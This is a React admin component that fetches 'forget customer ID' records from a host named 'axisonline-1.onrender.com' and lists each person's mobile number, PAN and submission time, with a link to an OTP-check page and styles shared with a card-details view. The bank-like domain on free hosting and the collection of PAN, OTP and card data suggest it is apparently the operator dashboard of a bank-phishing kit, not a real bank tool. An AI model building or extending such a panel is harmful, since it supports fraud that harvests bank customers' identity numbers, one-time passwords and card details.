import { useEffect, useState } from "react";
import "./cardsdetails.css"; // reuse CSS
import { useNavigate } from "react-router-dom";

export default function ForgetCustomerDetails() {
  const [customers, setCustomers] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  // Convert UTC to IST
  const formatIST = (utcDate) => {
    return new Date(utcDate).toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });
  };

  // Fetch forget customers
  const fetchCustomers = () => {
    setLoading(true);
    fetch("https://axisonline-1.onrender.com/api/users/forget-customer-id/list")
      .then((res) => res.json())
      .then((data) => {
        setCustomers(data);
        setLoading(false);
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        setLoading(false);
      });
  };

  // Navigate to OTP page
  const goToOTP = () => {
    navigate("/admin/otp-check"); // change route if different
  };

  useEffect(() => {
    fetchCustomers();
  }, []);

  return (
    <div className="usercards-container">
      <div className="usercards-header">
        <h2>Forget Customer Details</h2>
        <div className="header-buttons">
          <button className="otp-btn-small" onClick={fetchCustomers}>
            Refresh
          </button>
          <button className="otp-btn-small" onClick={goToOTP}>
            OTP
          </button>
        </div>
      </div>

      {loading ? (
        <p>Loading customers...</p>
      ) : customers.length === 0 ? (
        <p>No customers found</p>
      ) : (
        <div className="table-wrapper">
          <table className="usercards-table">
            <thead>
              <tr>
                <th>Mobile</th>
                <th>PAN</th>
                <th>Created At (IST)</th>
              </tr>
            </thead>
            <tbody>
              {customers.map((c) => (
                <tr key={c._id}>
                  <td>{c.mobile}</td>
                  <td>{c.pan}</td>
                  <td>{formatIST(c.createdAt)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
